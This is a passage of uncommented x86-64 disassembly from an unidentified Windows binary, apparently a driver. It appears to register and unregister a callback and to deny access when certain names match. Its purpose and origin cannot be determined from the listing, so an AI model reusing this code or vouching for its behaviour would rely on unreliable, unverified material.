   140003312:	48 8d 0d 6f 85 00 00 	lea    0x856f(%rip),%rcx        # 0x14000b888
   140003319:	ff 15 51 4e 00 00    	call   *0x4e51(%rip)        # 0x140008170
   14000331f:	bd 22 00 00 c0       	mov    $0xc0000022,%ebp
   140003324:	85 c0                	test   %eax,%eax
   140003326:	78 1c                	js     0x140003344
   140003328:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000332d:	4c 8b c3             	mov    %rbx,%r8
   140003330:	0f b7 11             	movzwl (%rcx),%edx
   140003333:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140003337:	d1 ea                	shr    $1,%edx
   140003339:	e8 3a 18 00 00       	call   0x140004b78
   14000333e:	48 85 c0             	test   %rax,%rax
   140003341:	0f 45 f5             	cmovne %ebp,%esi
   140003344:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140003348:	ff 15 2a 4e 00 00    	call   *0x4e2a(%rip)        # 0x140008178
   14000334e:	84 c0                	test   %al,%al
   140003350:	0f 84 01 01 00 00    	je     0x140003457
   140003356:	48 8b 47 08          	mov    0x8(%rdi),%rax
   14000335a:	66 44 39 30          	cmp    %r14w,(%rax)
   14000335e:	0f 86 f3 00 00 00    	jbe    0x140003457
   140003364:	4c 39 70 08          	cmp    %r14,0x8(%rax)
   140003368:	0f 84 e9 00 00 00    	je     0x140003457
   14000336e:	33 c9                	xor    %ecx,%ecx
   140003370:	48 8b d8             	mov    %rax,%rbx
   140003373:	e8 a8 e7 ff ff       	call   0x140001b20
   140003378:	0f b7 13             	movzwl (%rbx),%edx
   14000337b:	4c 8b c0             	mov    %rax,%r8
   14000337e:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140003382:	d1 ea                	shr    $1,%edx
   140003384:	e8 ef 17 00 00       	call   0x140004b78
   140003389:	48 85 c0             	test   %rax,%rax
   14000338c:	75 26                	jne    0x1400033b4
   14000338e:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   140003392:	8d 48 02             	lea    0x2(%rax),%ecx
   140003395:	e8 86 e7 ff ff       	call   0x140001b20
   14000339a:	0f b7 13             	movzwl (%rbx),%edx
   14000339d:	4c 8b c0             	mov    %rax,%r8
   1400033a0:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400033a4:	d1 ea                	shr    $1,%edx
   1400033a6:	e8 cd 17 00 00       	call   0x140004b78
   1400033ab:	48 85 c0             	test   %rax,%rax
   1400033ae:	0f 84 a3 00 00 00    	je     0x140003457
   1400033b4:	8b f5                	mov    %ebp,%esi
   1400033b6:	e9 9c 00 00 00       	jmp    0x140003457
   1400033bb:	48 85 ff             	test   %rdi,%rdi
   1400033be:	0f 84 93 00 00 00    	je     0x140003457
   1400033c4:	48 8b cf             	mov    %rdi,%rcx
   1400033c7:	ff 15 ab 4d 00 00    	call   *0x4dab(%rip)        # 0x140008178
   1400033cd:	84 c0                	test   %al,%al
   1400033cf:	0f 84 82 00 00 00    	je     0x140003457
   1400033d5:	48 8b 17             	mov    (%rdi),%rdx
   1400033d8:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   1400033dd:	45 33 c0             	xor    %r8d,%r8d
   1400033e0:	48 8d 0d a1 84 00 00 	lea    0x84a1(%rip),%rcx        # 0x14000b888
   1400033e7:	ff 15 83 4d 00 00    	call   *0x4d83(%rip)        # 0x140008170
   1400033ed:	85 c0                	test   %eax,%eax
   1400033ef:	78 66                	js     0x140003457
   1400033f1:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400033f6:	4c 8b c3             	mov    %rbx,%r8
   1400033f9:	0f b7 11             	movzwl (%rcx),%edx
   1400033fc:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140003400:	d1 ea                	shr    $1,%edx
   140003402:	e8 71 17 00 00       	call   0x140004b78
   140003407:	48 85 c0             	test   %rax,%rax
   14000340a:	75 46                	jne    0x140003452
   14000340c:	8d 48 05             	lea    0x5(%rax),%ecx
   14000340f:	e8 0c e7 ff ff       	call   0x140001b20
   140003414:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140003419:	4c 8b c0             	mov    %rax,%r8
   14000341c:	0f b7 11             	movzwl (%rcx),%edx
   14000341f:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140003423:	d1 ea                	shr    $1,%edx
   140003425:	e8 4e 17 00 00       	call   0x140004b78
   14000342a:	48 85 c0             	test   %rax,%rax
   14000342d:	75 23                	jne    0x140003452
   14000342f:	8d 48 06             	lea    0x6(%rax),%ecx
   140003432:	e8 e9 e6 ff ff       	call   0x140001b20
   140003437:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000343c:	4c 8b c0             	mov    %rax,%r8
   14000343f:	0f b7 11             	movzwl (%rcx),%edx
   140003442:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140003446:	d1 ea                	shr    $1,%edx
   140003448:	e8 2b 17 00 00       	call   0x140004b78
   14000344d:	48 85 c0             	test   %rax,%rax
   140003450:	74 05                	je     0x140003457
   140003452:	be 22 00 00 c0       	mov    $0xc0000022,%esi
   140003457:	8b c6                	mov    %esi,%eax
   140003459:	eb 02                	jmp    0x14000345d
   14000345b:	33 c0                	xor    %eax,%eax
   14000345d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003462:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140003467:	48 83 c4 20          	add    $0x20,%rsp
   14000346b:	41 5e                	pop    %r14
   14000346d:	5f                   	pop    %rdi
   14000346e:	5e                   	pop    %rsi
   14000346f:	c3                   	ret
   140003470:	48 83 ec 28          	sub    $0x28,%rsp
   140003474:	80 3d 15 84 00 00 00 	cmpb   $0x0,0x8415(%rip)        # 0x14000b890
   14000347b:	74 14                	je     0x140003491
   14000347d:	48 8b 0d 04 84 00 00 	mov    0x8404(%rip),%rcx        # 0x14000b888
   140003484:	ff 15 d6 4c 00 00    	call   *0x4cd6(%rip)        # 0x140008160
   14000348a:	c6 05 ff 83 00 00 00 	movb   $0x0,0x83ff(%rip)        # 0x14000b890
   140003491:	48 83 c4 28          	add    $0x28,%rsp
   140003495:	c3                   	ret
   140003496:	cc                   	int3
   140003497:	cc                   	int3
   140003498:	40 53                	rex push %rbx
   14000349a:	48 83 ec 40          	sub    $0x40,%rsp
   14000349e:	80 3d eb 83 00 00 00 	cmpb   $0x0,0x83eb(%rip)        # 0x14000b890
   1400034a5:	48 8b d9             	mov    %rcx,%rbx
   1400034a8:	74 04                	je     0x1400034ae
   1400034aa:	b0 01                	mov    $0x1,%al
   1400034ac:	eb 47                	jmp    0x1400034f5
   1400034ae:	48 8d 15 5b 41 00 00 	lea    0x415b(%rip),%rdx        # 0x140007610
   1400034b5:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400034ba:	ff 15 88 4e 00 00    	call   *0x4e88(%rip)        # 0x140008348
   1400034c0:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   1400034c6:	48 8d 05 bb 83 00 00 	lea    0x83bb(%rip),%rax        # 0x14000b888
   1400034cd:	45 33 c9             	xor    %r9d,%r9d
   1400034d0:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400034d5:	4c 8b c3             	mov    %rbx,%r8
   1400034d8:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400034dd:	48 8d 0d 9c fd ff ff 	lea    -0x264(%rip),%rcx        # 0x140003280
   1400034e4:	ff 15 7e 4c 00 00    	call   *0x4c7e(%rip)        # 0x140008168
   1400034ea:	85 c0                	test   %eax,%eax
   1400034ec:	0f 99 c0             	setns  %al
   1400034ef:	88 05 9b 83 00 00    	mov    %al,0x839b(%rip)        # 0x14000b890
   1400034f5:	48 83 c4 40          	add    $0x40,%rsp
   1400034f9:	5b                   	pop    %rbx
   1400034fa:	c3                   	ret
   1400034fb:	cc                   	int3
   1400034fc:	48 89 0d 95 83 00 00 	mov    %rcx,0x8395(%rip)        # 0x14000b898
   140003503:	c3                   	ret
   140003504:	48 83 ec 28          	sub    $0x28,%rsp
   140003508:	e8 93 00 00 00       	call   0x1400035a0
   14000350d:	84 c0                	test   %al,%al
   14000350f:	75 07                	jne    0x140003518
   140003511:	32 c0                	xor    %al,%al
   140003513:	e9 82 00 00 00       	jmp    0x14000359a
   140003518:	83 3d 51 82 00 00 ff 	cmpl   $0xffffffff,0x8251(%rip)        # 0x14000b770
   14000351f:	75 09                	jne    0x14000352a
   140003521:	83 25 48 82 00 00 00 	andl   $0x0,0x8248(%rip)        # 0x14000b770
   140003528:	eb e7                	jmp    0x140003511
   14000352a:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000352f:	e8 ec e5 ff ff       	call   0x140001b20
   140003534:	48 8b d0             	mov    %rax,%rdx
   140003537:	4c 8d 05 72 9b 00 00 	lea    0x9b72(%rip),%r8        # 0x14000d0b0
   14000353e:	48 8d 0d 6b 83 00 00 	lea    0x836b(%rip),%rcx        # 0x14000b8b0
   140003545:	e8 c6 02 00 00       	call   0x140003810
   14000354a:	83 3d 1f 82 00 00 00 	cmpl   $0x0,0x821f(%rip)        # 0x14000b770
   140003551:	8a c8                	mov    %al,%cl
   140003553:	75 2a                	jne    0x14000357f
   140003555:	3c 01                	cmp    $0x1,%al
   140003557:	75 30                	jne    0x140003589
   140003559:	33 c9                	xor    %ecx,%ecx
   14000355b:	e8 c0 e5 ff ff       	call   0x140001b20
   140003560:	44 8b 0d 45 83 00 00 	mov    0x8345(%rip),%r9d        # 0x14000b8ac
   140003567:	4c 8d 05 42 a3 00 00 	lea    0xa342(%rip),%r8        # 0x14000d8b0
   14000356e:	48 8b d0             	mov    %rax,%rdx
   140003571:	48 8d 0d 38 8b 00 00 	lea    0x8b38(%rip),%rcx        # 0x14000c0b0
   140003578:	e8 77 01 00 00       	call   0x1400036f4
   14000357d:	8a c8                	mov    %al,%cl
   14000357f:	8b 05 eb 81 00 00    	mov    0x81eb(%rip),%eax        # 0x14000b770
   140003585:	85 c0                	test   %eax,%eax
   140003587:	7f 07                	jg     0x140003590
   140003589:	b8 0c 00 00 00       	mov    $0xc,%eax
   14000358e:	eb 02                	jmp    0x140003592
   140003590:	ff c8                	dec    %eax
   140003592:	89 05 d8 81 00 00    	mov    %eax,0x81d8(%rip)        # 0x14000b770
   140003598:	8a c1                	mov    %cl,%al
   14000359a:	48 83 c4 28          	add    $0x28,%rsp
   14000359e:	c3                   	ret
   14000359f:	cc                   	int3
   1400035a0:	40 57                	rex push %rdi
   1400035a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400035a6:	48 83 3d f2 82 00 00 	cmpq   $0x0,0x82f2(%rip)        # 0x14000b8a0
   1400035ad:	00 
   1400035ae:	74 07                	je     0x1400035b7
   1400035b0:	b0 01                	mov    $0x1,%al
   1400035b2:	e9 c0 00 00 00       	jmp    0x140003677
   1400035b7:	e8 e8 19 00 00       	call   0x140004fa4
   1400035bc:	48 89 05 dd 82 00 00 	mov    %rax,0x82dd(%rip)        # 0x14000b8a0
   1400035c3:	48 85 c0             	test   %rax,%rax
   1400035c6:	0f 84 a0 00 00 00    	je     0x14000366c
   1400035cc:	33 c0                	xor    %eax,%eax
   1400035ce:	48 8d 3d db 82 00 00 	lea    0x82db(%rip),%rdi        # 0x14000b8b0
   1400035d5:	ba 00 08 00 00       	mov    $0x800,%edx
   1400035da:	8b ca                	mov    %edx,%ecx
   1400035dc:	f3 aa                	rep stos %al,(%rdi)
   1400035de:	8b ca                	mov    %edx,%ecx
   1400035e0:	48 8d 3d c9 8a 00 00 	lea    0x8ac9(%rip),%rdi        # 0x14000c0b0
   1400035e7:	f3 aa                	rep stos %al,(%rdi)
   1400035e9:	8d 78 04             	lea    0x4(%rax),%edi
   1400035ec:	8b cf                	mov    %edi,%ecx
   1400035ee:	e8 2d e5 ff ff       	call   0x140001b20
   1400035f3:	48 8b d0             	mov    %rax,%rdx
   1400035f6:	48 8d 0d b3 82 00 00 	lea    0x82b3(%rip),%rcx        # 0x14000b8b0
   1400035fd:	e8 3a 3a 00 00       	call   0x14000703c
   140003602:	48 8b 15 97 82 00 00 	mov    0x8297(%rip),%rdx        # 0x14000b8a0
   140003609:	48 8d 0d a0 82 00 00 	lea    0x82a0(%rip),%rcx        # 0x14000b8b0
   140003610:	e8 27 3a 00 00       	call   0x14000703c
   140003615:	8d 4f 01             	lea    0x1(%rdi),%ecx
   140003618:	e8 03 e5 ff ff       	call   0x140001b20
   14000361d:	48 8b d0             	mov    %rax,%rdx
   140003620:	48 8d 0d 89 82 00 00 	lea    0x8289(%rip),%rcx        # 0x14000b8b0
   140003627:	e8 10 3a 00 00       	call   0x14000703c
   14000362c:	8b cf                	mov    %edi,%ecx
   14000362e:	e8 ed e4 ff ff       	call   0x140001b20
   140003633:	48 8b d0             	mov    %rax,%rdx
   140003636:	48 8d 0d 73 8a 00 00 	lea    0x8a73(%rip),%rcx        # 0x14000c0b0
   14000363d:	e8 fa 39 00 00       	call   0x14000703c
   140003642:	48 8b 15 57 82 00 00 	mov    0x8257(%rip),%rdx        # 0x14000b8a0
   140003649:	48 8d 0d 60 8a 00 00 	lea    0x8a60(%rip),%rcx        # 0x14000c0b0
   140003650:	e8 e7 39 00 00       	call   0x14000703c
   140003655:	8d 4f 02             	lea    0x2(%rdi),%ecx
   140003658:	e8 c3 e4 ff ff       	call   0x140001b20
   14000365d:	48 8b d0             	mov    %rax,%rdx
   140003660:	48 8d 0d 49 8a 00 00 	lea    0x8a49(%rip),%rcx        # 0x14000c0b0
   140003667:	e8 d0 39 00 00       	call   0x14000703c
   14000366c:	48 83 3d 2c 82 00 00 	cmpq   $0x0,0x822c(%rip)        # 0x14000b8a0
   140003673:	00 
   140003674:	0f 95 c0             	setne  %al
   140003677:	48 83 c4 20          	add    $0x20,%rsp
   14000367b:	5f                   	pop    %rdi
   14000367c:	c3                   	ret
   14000367d:	cc                   	int3
   14000367e:	cc                   	int3
   14000367f:	cc                   	int3
   140003680:	48 83 ec 28          	sub    $0x28,%rsp
   140003684:	e8 17 ff ff ff       	call   0x1400035a0
   140003689:	84 c0                	test   %al,%al
   14000368b:	75 02                	jne    0x14000368f
   14000368d:	eb 5e                	jmp    0x1400036ed
   14000368f:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003694:	48 8d 0d 15 82 00 00 	lea    0x8215(%rip),%rcx        # 0x14000b8b0
   14000369b:	e8 e4 17 00 00       	call   0x140004e84
   1400036a0:	85 c0                	test   %eax,%eax
   1400036a2:	78 16                	js     0x1400036ba
   1400036a4:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400036a9:	b2 01                	mov    $0x1,%dl
   1400036ab:	e8 d4 15 00 00       	call   0x140004c84
   1400036b0:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400036b5:	e8 b2 17 00 00       	call   0x140004e6c
   1400036ba:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400036c0:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400036c5:	48 8d 0d e4 89 00 00 	lea    0x89e4(%rip),%rcx        # 0x14000c0b0
   1400036cc:	e8 b3 17 00 00       	call   0x140004e84
   1400036d1:	85 c0                	test   %eax,%eax
   1400036d3:	78 16                	js     0x1400036eb
   1400036d5:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400036da:	b2 01                	mov    $0x1,%dl
   1400036dc:	e8 a3 15 00 00       	call   0x140004c84
   1400036e1:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400036e6:	e8 81 17 00 00       	call   0x140004e6c
   1400036eb:	b0 01                	mov    $0x1,%al
   1400036ed:	48 83 c4 28          	add    $0x28,%rsp
   1400036f1:	c3                   	ret
   1400036f2:	cc                   	int3
   1400036f3:	cc                   	int3
   1400036f4:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400036f9:	55                   	push   %rbp
   1400036fa:	56                   	push   %rsi
   1400036fb:	57                   	push   %rdi
   1400036fc:	41 56                	push   %r14
   1400036fe:	41 57                	push   %r15
   140003700:	48 81 ec 40 02 00 00 	sub    $0x240,%rsp
   140003707:	48 8b 05 a2 80 00 00 	mov    0x80a2(%rip),%rax        # 0x14000b7b0
   14000370e:	48 33 c4             	xor    %rsp,%rax
   140003711:	48 89 84 24 30 02 00 	mov    %rax,0x230(%rsp)
   140003718:	00 
   140003719:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000371f:	49 8b f0             	mov    %r8,%rsi
   140003722:	4c 8b fa             	mov    %rdx,%r15
   140003725:	4c 8b f1             	mov    %rcx,%r14
   140003728:	33 d2                	xor    %edx,%edx
   14000372a:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000372f:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140003735:	41 8b e9             	mov    %r9d,%ebp
   140003738:	e8 43 3d 00 00       	call   0x140007480
   14000373d:	32 db                	xor    %bl,%bl
   14000373f:	85 ed                	test   %ebp,%ebp
   140003741:	0f 84 9d 00 00 00    	je     0x1400037e4
   140003747:	81 fd 00 02 00 00    	cmp    $0x200,%ebp
   14000374d:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140003752:	bf ff 01 00 00       	mov    $0x1ff,%edi
   140003757:	49 8b d7             	mov    %r15,%rdx
   14000375a:	49 8b ce             	mov    %r14,%rcx
   14000375d:	0f 46 fd             	cmovbe %ebp,%edi
   140003760:	e8 2f 1b 00 00       	call   0x140005294
   140003765:	85 c0                	test   %eax,%eax
   140003767:	78 69                	js     0x1400037d2
   140003769:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000376e:	48 85 c9             	test   %rcx,%rcx
   140003771:	74 71                	je     0x1400037e4
   140003773:	48 8d 51 0c          	lea    0xc(%rcx),%rdx
   140003777:	48 85 d2             	test   %rdx,%rdx
   14000377a:	74 5b                	je     0x1400037d7
   14000377c:	44 8b 41 08          	mov    0x8(%rcx),%r8d
   140003780:	41 8d 40 ff          	lea    -0x1(%r8),%eax
   140003784:	3d ff 01 00 00       	cmp    $0x1ff,%eax
   140003789:	77 4c                	ja     0x1400037d7
   14000378b:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003790:	e8 2b 3a 00 00       	call   0x1400071c0
   140003795:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000379a:	81 ff 00 02 00 00    	cmp    $0x200,%edi
   1400037a0:	73 30                	jae    0x1400037d2
   1400037a2:	4c 63 c7             	movslq %edi,%r8
   1400037a5:	85 ff                	test   %edi,%edi
   1400037a7:	7e 29                	jle    0x1400037d2
   1400037a9:	33 d2                	xor    %edx,%edx
   1400037ab:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400037b0:	48 2b f0             	sub    %rax,%rsi
   1400037b3:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400037b8:	48 03 c2             	add    %rdx,%rax
   1400037bb:	0f be 0c 06          	movsbl (%rsi,%rax,1),%ecx
   1400037bf:	0f be 00             	movsbl (%rax),%eax
   1400037c2:	3b c1                	cmp    %ecx,%eax
   1400037c4:	75 0a                	jne    0x1400037d0
   1400037c6:	48 03 d3             	add    %rbx,%rdx
   1400037c9:	49 3b d0             	cmp    %r8,%rdx
   1400037cc:	7c e5                	jl     0x1400037b3
   1400037ce:	eb 02                	jmp    0x1400037d2
   1400037d0:	32 db                	xor    %bl,%bl
   1400037d2:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400037d7:	48 85 c9             	test   %rcx,%rcx
   1400037da:	74 08                	je     0x1400037e4
   1400037dc:	33 d2                	xor    %edx,%edx
   1400037de:	ff 15 5c 4b 00 00    	call   *0x4b5c(%rip)        # 0x140008340
   1400037e4:	8a c3                	mov    %bl,%al
   1400037e6:	48 8b 8c 24 30 02 00 	mov    0x230(%rsp),%rcx
   1400037ed:	00 
   1400037ee:	48 33 cc             	xor    %rsp,%rcx
   1400037f1:	e8 ba 38 00 00       	call   0x1400070b0
   1400037f6:	48 8b 9c 24 80 02 00 	mov    0x280(%rsp),%rbx
   1400037fd:	00 
   1400037fe:	48 81 c4 40 02 00 00 	add    $0x240,%rsp
   140003805:	41 5f                	pop    %r15
   140003807:	41 5e                	pop    %r14
   140003809:	5f                   	pop    %rdi
   14000380a:	5e                   	pop    %rsi
   14000380b:	5d                   	pop    %rbp
   14000380c:	c3                   	ret
   14000380d:	cc                   	int3
   14000380e:	cc                   	int3
   14000380f:	cc                   	int3
   140003810:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003815:	55                   	push   %rbp
   140003816:	56                   	push   %rsi
   140003817:	57                   	push   %rdi
   140003818:	48 81 ec 40 04 00 00 	sub    $0x440,%rsp
   14000381f:	48 8b 05 8a 7f 00 00 	mov    0x7f8a(%rip),%rax        # 0x14000b7b0
   140003826:	48 33 c4             	xor    %rsp,%rax
   140003829:	48 89 84 24 30 04 00 	mov    %rax,0x430(%rsp)
   140003830:	00 
   140003831:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140003837:	49 8b e8             	mov    %r8,%rbp
   14000383a:	48 8b fa             	mov    %rdx,%rdi
   14000383d:	48 8b d9             	mov    %rcx,%rbx
   140003840:	33 d2                	xor    %edx,%edx
   140003842:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003847:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   14000384d:	e8 2e 3c 00 00       	call   0x140007480
   140003852:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140003857:	48 8b d7             	mov    %rdi,%rdx
   14000385a:	48 8b cb             	mov    %rbx,%rcx
   14000385d:	40 32 f6             	xor    %sil,%sil
   140003860:	e8 2f 1a 00 00       	call   0x140005294
   140003865:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000386a:	85 c0                	test   %eax,%eax
   14000386c:	78 50                	js     0x1400038be
   14000386e:	48 85 c9             	test   %rcx,%rcx
   140003871:	74 58                	je     0x1400038cb
   140003873:	48 8d 51 0c          	lea    0xc(%rcx),%rdx
   140003877:	48 85 d2             	test   %rdx,%rdx
   14000387a:	74 42                	je     0x1400038be
   14000387c:	44 8b 49 08          	mov    0x8(%rcx),%r9d
   140003880:	41 8d 41 ff          	lea    -0x1(%r9),%eax
   140003884:	3d ff 03 00 00       	cmp    $0x3ff,%eax
   140003889:	77 33                	ja     0x1400038be
   14000388b:	45 8b c1             	mov    %r9d,%r8d
   14000388e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003893:	e8 28 39 00 00       	call   0x1400071c0
   140003898:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   14000389e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400038a3:	48 8b d5             	mov    %rbp,%rdx
   1400038a6:	e8 9d 37 00 00       	call   0x140007048
   1400038ab:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400038b0:	40 0f b6 f6          	movzbl %sil,%esi
   1400038b4:	85 c0                	test   %eax,%eax
   1400038b6:	0f 44 f1             	cmove  %ecx,%esi
   1400038b9:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400038be:	48 85 c9             	test   %rcx,%rcx
   1400038c1:	74 08                	je     0x1400038cb
   1400038c3:	33 d2                	xor    %edx,%edx
   1400038c5:	ff 15 75 4a 00 00    	call   *0x4a75(%rip)        # 0x140008340
   1400038cb:	40 8a c6             	mov    %sil,%al
   1400038ce:	48 8b 8c 24 30 04 00 	mov    0x430(%rsp),%rcx
   1400038d5:	00 
   1400038d6:	48 33 cc             	xor    %rsp,%rcx
   1400038d9:	e8 d2 37 00 00       	call   0x1400070b0
   1400038de:	48 8b 9c 24 78 04 00 	mov    0x478(%rsp),%rbx
   1400038e5:	00 
   1400038e6:	48 81 c4 40 04 00 00 	add    $0x440,%rsp
   1400038ed:	5f                   	pop    %rdi
   1400038ee:	5e                   	pop    %rsi
   1400038ef:	5d                   	pop    %rbp
   1400038f0:	c3                   	ret
   1400038f1:	cc                   	int3
   1400038f2:	cc                   	int3
   1400038f3:	cc                   	int3
   1400038f4:	48 8b c4             	mov    %rsp,%rax
   1400038f7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400038fb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400038ff:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140003903:	41 56                	push   %r14
   140003905:	48 83 ec 30          	sub    $0x30,%rsp
   140003909:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000390c:	49 8b d8             	mov    %r8,%rbx
   14000390f:	4c 8b c9             	mov    %rcx,%r9
   140003912:	0f 11 40 e8          	movups %xmm0,-0x18(%rax)
   140003916:	84 d2                	test   %dl,%dl
   140003918:	0f 84 3b 01 00 00    	je     0x140003a59
   14000391e:	48 85 c9             	test   %rcx,%rcx
   140003921:	0f 84 32 01 00 00    	je     0x140003a59
   140003927:	80 39 00             	cmpb   $0x0,(%rcx)
   14000392a:	0f 84 29 01 00 00    	je     0x140003a59
   140003930:	4c 8d 35 79 8f 00 00 	lea    0x8f79(%rip),%r14        # 0x14000c8b0
   140003937:	bd 00 04 00 00       	mov    $0x400,%ebp
   14000393c:	33 c0                	xor    %eax,%eax
   14000393e:	49 8b fe             	mov    %r14,%rdi
   140003941:	8b cd                	mov    %ebp,%ecx
   140003943:	44 8b c5             	mov    %ebp,%r8d
   140003946:	f3 aa                	rep stos %al,(%rdi)
   140003948:	49 8b c9             	mov    %r9,%rcx
   14000394b:	49 8b d6             	mov    %r14,%rdx
   14000394e:	e8 b5 28 00 00       	call   0x140006208
   140003953:	84 c0                	test   %al,%al
   140003955:	0f 84 fe 00 00 00    	je     0x140003a59
   14000395b:	b9 03 00 00 00       	mov    $0x3,%ecx
   140003960:	e8 7f e1 ff ff       	call   0x140001ae4
   140003965:	41 b8 1e 00 00 00    	mov    $0x1e,%r8d
   14000396b:	48 8b d0             	mov    %rax,%rdx
   14000396e:	49 8b ce             	mov    %r14,%rcx
   140003971:	e8 a6 1a 00 00       	call   0x14000541c
   140003976:	48 85 c0             	test   %rax,%rax
   140003979:	0f 84 da 00 00 00    	je     0x140003a59
   14000397f:	8b d5                	mov    %ebp,%edx
   140003981:	49 8b ce             	mov    %r14,%rcx
   140003984:	e8 bb 25 00 00       	call   0x140005f44
   140003989:	48 8b f8             	mov    %rax,%rdi
   14000398c:	48 85 c0             	test   %rax,%rax
   14000398f:	0f 84 c0 00 00 00    	je     0x140003a55
   140003995:	4c 8d 35 14 93 00 00 	lea    0x9314(%rip),%r14        # 0x14000ccb0
   14000399c:	44 8b c5             	mov    %ebp,%r8d
   14000399f:	49 8b d6             	mov    %r14,%rdx
   1400039a2:	48 8b c8             	mov    %rax,%rcx
   1400039a5:	e8 86 36 00 00       	call   0x140007030
   1400039aa:	85 c0                	test   %eax,%eax
   1400039ac:	0f 84 a0 00 00 00    	je     0x140003a52
   1400039b2:	44 8b c5             	mov    %ebp,%r8d
   1400039b5:	48 8b d7             	mov    %rdi,%rdx
   1400039b8:	49 8b ce             	mov    %r14,%rcx
   1400039bb:	e8 76 36 00 00       	call   0x140007036
   1400039c0:	49 8b d6             	mov    %r14,%rdx
   1400039c3:	c6 05 e5 96 00 00 00 	movb   $0x0,0x96e5(%rip)        # 0x14000d0af
   1400039ca:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400039cf:	ff 15 db 47 00 00    	call   *0x47db(%rip)        # 0x1400081b0
   1400039d5:	48 8d 15 d4 96 00 00 	lea    0x96d4(%rip),%rdx        # 0x14000d0b0
   1400039dc:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400039e1:	e8 16 11 00 00       	call   0x140004afc
   1400039e6:	49 8b ce             	mov    %r14,%rcx
   1400039e9:	e8 3c 36 00 00       	call   0x14000702a
   1400039ee:	44 8b c5             	mov    %ebp,%r8d
   1400039f1:	89 05 b1 7e 00 00    	mov    %eax,0x7eb1(%rip)        # 0x14000b8a8
   1400039f7:	33 d2                	xor    %edx,%edx
   1400039f9:	48 8d 0d b0 9e 00 00 	lea    0x9eb0(%rip),%rcx        # 0x14000d8b0
   140003a00:	e8 7b 3a 00 00       	call   0x140007480
   140003a05:	41 b8 18 00 00 00    	mov    $0x18,%r8d
   140003a0b:	48 8d 15 66 7d 00 00 	lea    0x7d66(%rip),%rdx        # 0x14000b778
   140003a12:	48 8d 0d 97 9e 00 00 	lea    0x9e97(%rip),%rcx        # 0x14000d8b0
   140003a19:	e8 a2 37 00 00       	call   0x1400071c0
   140003a1e:	4c 63 05 83 7e 00 00 	movslq 0x7e83(%rip),%r8        # 0x14000b8a8
   140003a25:	48 8d 0d 9c 9e 00 00 	lea    0x9e9c(%rip),%rcx        # 0x14000d8c8
   140003a2c:	49 8b d6             	mov    %r14,%rdx
   140003a2f:	e8 8c 37 00 00       	call   0x1400071c0
   140003a34:	8b 05 6e 7e 00 00    	mov    0x7e6e(%rip),%eax        # 0x14000b8a8
   140003a3a:	88 05 84 9e 00 00    	mov    %al,0x9e84(%rip)        # 0x14000d8c4
   140003a40:	8d 04 45 18 00 00 00 	lea    0x18(,%rax,2),%eax
   140003a47:	89 05 5f 7e 00 00    	mov    %eax,0x7e5f(%rip)        # 0x14000b8ac
   140003a4d:	c6 03 01             	movb   $0x1,(%rbx)
   140003a50:	eb 03                	jmp    0x140003a55
   140003a52:	c6 03 00             	movb   $0x0,(%rbx)
   140003a55:	b0 01                	mov    $0x1,%al
   140003a57:	eb 02                	jmp    0x140003a5b
   140003a59:	32 c0                	xor    %al,%al
   140003a5b:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003a60:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140003a65:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
